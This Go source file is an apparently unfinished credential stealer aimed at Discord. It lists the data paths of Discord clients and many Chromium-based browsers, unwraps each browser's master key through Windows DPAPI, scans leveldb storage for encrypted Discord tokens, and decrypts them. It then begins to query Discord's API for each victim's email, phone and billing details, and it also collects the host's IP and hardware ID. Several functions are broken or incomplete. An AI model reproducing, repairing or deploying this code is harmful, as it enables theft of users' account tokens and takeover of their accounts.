package main

import (
	"bufio"
	"crypto/aes"
	"encoding/base64"
	"encoding/json"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32DLL = windows.NewLazySystemDLL("advapi32.dll")
	// Load the CryptUnprotectData function from the advapi32 DLL.
	cryptUnprotectDataProc = advapi32DLL.NewProc("CryptUnprotectData")
)

type Path struct {
	name string
	path string
}

type Paths struct {
	paths []Path
}

type LocalState struct {
	os_crypt struct {
		encrypted_key string
	}
}

func (p *Paths) Add(name, path string) {
	p.paths = append(p.paths, Path{name, path})
}

func (p *Paths) Get_Specific(name string) string {
	for _, path := range p.paths {
		if path.name == name {
			return path.path
		}
	}
	return ""
}

var Roaming = os.Getenv("APPDATA")
var Local = os.Getenv("LOCALAPPDATA")

var Paths_Seriously = Paths{}

func initialize_struct() {
	Paths_Seriously.Add("Discord", Roaming+"\\Discord")
	Paths_Seriously.Add("Discord Canary", Roaming+"\\discordcanary")
	Paths_Seriously.Add("Discord PTB", Roaming+"\\discordptb")
	Paths_Seriously.Add("Lightcord", Roaming+"\\Lightcord")
	Paths_Seriously.Add("Opera", Roaming+"\\Opera Software\\Opera Stable")
	Paths_Seriously.Add("Opera GX", Roaming+"\\Opera Software\\Opera GX Stable")
	Paths_Seriously.Add("Amigo", Roaming+"\\Amigo\\User Data\\Default")
	Paths_Seriously.Add("Torch", Roaming+"\\Torch\\User Data\\Default")
	Paths_Seriously.Add("Kometa", Roaming+"\\Kometa\\User Data\\Default")
	Paths_Seriously.Add("Orbitum", Roaming+"\\Orbitum\\User Data\\Default")
	Paths_Seriously.Add("CentBrowser", Roaming+"\\CentBrowser\\User Data\\Default")
	Paths_Seriously.Add("7Star", Roaming+"\\7Star\\7Star\\User Data\\Default")
	Paths_Seriously.Add("Sputnik", Roaming+"\\Sputnik\\Sputnik\\User Data\\Default")
	Paths_Seriously.Add("Vivaldi", Roaming+"\\Vivaldi\\User Data\\Default")
	Paths_Seriously.Add("Chrome SxS", Local+"\\Google\\Chrome SxS\\User Data\\Default")
	Paths_Seriously.Add("Chrome", Local+"\\Google\\Chrome\\User Data\\Default")
	Paths_Seriously.Add("Epic Privacy Browser", Local+"\\Epic Privacy Browser\\User Data\\Default")
	Paths_Seriously.Add("Microsoft Edge", Local+"\\Microsoft\\Edge\\User Data\\Default")
	Paths_Seriously.Add("Yandex", Local+"\\Yandex\\YandexBrowser\\User Data\\Default")
	Paths_Seriously.Add("Brave", Local+"\\BraveSoftware\\Brave-Browser\\User Data\\Default")
	Paths_Seriously.Add("Uran", Local+"\\uCozMedia\\Uran\\User Data\\Default")
	Paths_Seriously.Add("Iridium", Local+"\\Iridium\\User Data\\Default")
}

// CryptUnprotectData is a wrapper for the CryptUnprotectData function from the Windows API.
// It decrypts encrypted data using the specified key and optional entropy.
func CryptUnprotectData(encryptedData, key, entropy []byte) ([]byte, error) {
	// Set up the DataBlob structures for the input and output data.
	var inputDataBlob, outputDataBlob windows.DataBlob
	inputDataBlob.Size = uint32(len(encryptedData))
	inputDataBlob.Data = &encryptedData[0]
	outputDataBlob.Size = 0
	outputDataBlob.Data = nil

	// Set up the DataBlob structure for the key data.
	var keyDataBlob windows.DataBlob
	keyDataBlob.Size = uint32(len(key))
	keyDataBlob.Data = &key[0]

	// Set up the DataBlob structure for the entropy data, if provided.
	var entropyDataBlob *windows.DataBlob
	if entropy != nil {
		entropyDataBlob = &windows.DataBlob{Size: uint32(len(entropy)), Data: &entropy[0]}
	}

	// Call the CryptUnprotectData function.
	result, _, err := cryptUnprotectDataProc.Call(
		uintptr(unsafe.Pointer(&inputDataBlob)),
		uintptr(0),
		uintptr(unsafe.Pointer(entropyDataBlob)),
		uintptr(0),
		uintptr(0),
		0,
		uintptr(unsafe.Pointer(&outputDataBlob)))
	if result == 0 {
		return nil, err
	}

	// Extract the decrypted data from the output DataBlob.
	decryptedData := make([]byte, outputDataBlob.Size)
	copy(decryptedData, (*[1 << 30]byte)(unsafe.Pointer(outputDataBlob.Data))[:outputDataBlob.Size])
	return decryptedData, nil
}

// Decrypt decrypts the given encrypted buffer using the specified master key.
func Decrypt(buff, masterKey []byte) (string, error) {
	// Decrypt the master key using the CryptUnprotectData function.
	key, err := CryptUnprotectData(masterKey, nil, nil)
	if err != nil {
		return "", err
	}

	// Create a new AES cipher using the decrypted key and IV.
	cipher, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	// Decrypt the rest of the buffer using the cipher.
	decrypted := make([]byte, len(buff[16:]))
	cipher.Decrypt(decrypted, buff[16:])

	// Trim the last 16 bytes of the decrypted data (the GCM tag).
	decrypted = decrypted[:len(decrypted)-16]

	// Convert the decrypted data to a string.
	decryptedString, err := string(decrypted), nil
	if err != nil {
		return "", err
	}

	return decryptedString, nil
}

func Get_IP() (string, error) {
	// Get the IP address of the current host by send request to api.ipify.org
	res, err := http.Get("https://api.ipify.org")
	if err != nil {
		panic(res)
	}
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	return string(body), err
}

func Get_Hardware_ID() string {
	// Get the hardware ID of the current host by send request to api.ipify.org
	command := "wmic csproduct get uuid"
	res, err := exec.Command("cmd", "/C", command).Output()
	if err != nil {
		panic(err)
	}
	return string(res)
}

func Get_Token() []string {
	tokens := make([]string, 0)
	checks := make([]string, 0)
	for platform := range Paths_Seriously.paths {
		// Get the path of the current platform
		s := Paths_Seriously.paths[platform]

		// Check if the path exists
		_, err := os.Stat(s.path)
		if err != nil {
			continue
		}

		// now try to open it
		file, err := os.Open(s.path + "\\Local State")
		if err != nil {
			continue
		}
		defer file.Close()
		thingy := LocalState{}
		json.NewDecoder(file).Decode(&thingy)
		encrypted_key := thingy.os_crypt.encrypted_key

		// now try to loop all through local storage
		file, err = os.Open(s.path + "\\Local Storage\\leveldb")
		if err != nil {
			continue
		}
		defer file.Close()
		files, err := file.Readdir(-1)
		if err != nil {
			continue
		}
		for _, f := range files {
			file_local_storage, err := os.Open(s.path + "\\Local Storage\\leveldb\\" + f.Name())
			if err != nil {
				continue
			}
			defer file_local_storage.Close()
			regex := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*`)
			scanner := bufio.NewScanner(file_local_storage)
			var lines []string
			for scanner.Scan() {
				lines = append(lines, scanner.Text())
			}
			for _, line := range lines {
				{
					line = strings.TrimSpace(line)
					if regex.MatchString(line) {
						tokens = append(tokens, line)
					}
				}
			}
		}
		for i := range tokens {
			// clean
			tokens[i] = strings.Replace(tokens[i], "\\", "", -1)
			//now its time to decode
			j := strings.Split(tokens[i], ":")
			k, err := base64.StdEncoding.DecodeString(j[1])
			if err != nil {
				continue
			}
			n, err := base64.StdEncoding.DecodeString(encrypted_key)
			if err != nil {
				continue
			}
			decoded, err := Decrypt(k, n)
			if err != nil {
				continue
			}
			check = append(check, decoded)
		}
	}
	tokens = make([]string, 0) // clear it
	for i := range checks {
		response := Get_Information(checks[i])
	}
	return tokens
}

type Datastruct struct {
	user_name   string
	user_id     string
	email       string
	phone       string
	mfa_enabled bool
	has_nitro   bool
	nitro_data  struct{}
	days_left   int
}

func Get_Information(token string) Datastruct {
	url := "https://discord.com/api/v6/users/@me"
	nitro_url := "https://discord.com/api/v6/users/@me/billing/subscriptions"
}

func main() {
	initialize_struct()
	print("hello this is working")
}
